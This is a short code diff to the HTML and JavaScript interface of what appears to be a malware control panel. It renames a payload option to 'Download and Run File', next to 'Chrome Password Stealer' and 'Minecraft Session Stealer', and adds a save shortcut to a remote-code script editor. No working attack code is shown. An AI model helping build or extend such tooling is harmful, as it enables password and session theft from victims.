@@ -212,7 +212,7 @@
                                     <option>None</option>
                                     <option>Minecraft Session Stealer</option>
                                     <option>Chrome Password Stealer</option>
-                                    <option>File Downloader</option>
+                                    <option>Download and Run File</option>
                                 </select>
                                 <br/>
                                 <a>Reserved Variables/Functions:</a><br/>
@@ -237,6 +237,13 @@
                         });
                         editor.setTheme('ace/theme/solarized_dark');
                         editor.session.setMode('ace/mode/javascript');
+                        editor.commands.addCommand({
+                            name: 'save',
+                            bindKey: { win: 'Ctrl-S', mac: 'Cmd-S' },
+                            exec: function (editor) {
+                                $('#rceSave').click();
+                            },
+                        });
                     });
                 });
 
